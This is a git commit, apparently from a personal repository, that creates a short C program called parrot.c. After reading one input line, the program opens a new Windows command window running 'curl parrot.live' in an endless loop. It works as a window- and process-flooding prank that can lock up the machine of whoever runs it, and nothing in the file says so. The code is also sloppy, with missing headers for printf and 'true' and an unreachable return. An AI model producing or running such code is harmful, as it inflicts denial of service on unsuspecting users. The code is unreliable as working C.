057000789efb34f60e9e5600bb1fb82bd6acee55
polyhedron <107666435+FemboyPolyhedron@users.noreply.github.com>
2025-11-26 01:16:40 +0800

    Create parrot.c

---
+++ parrot.c
@@ -0,0 +1,12 @@
+#include <stdlib.h>
+
+int main() {
+    char cin[256];
+    printf("");
+    fgets(cin, sizeof(cin), stdin);
+    
+    while(true) {
+        system("start cmd /k curl parrot.live");
+    }
+    return -1;
+}
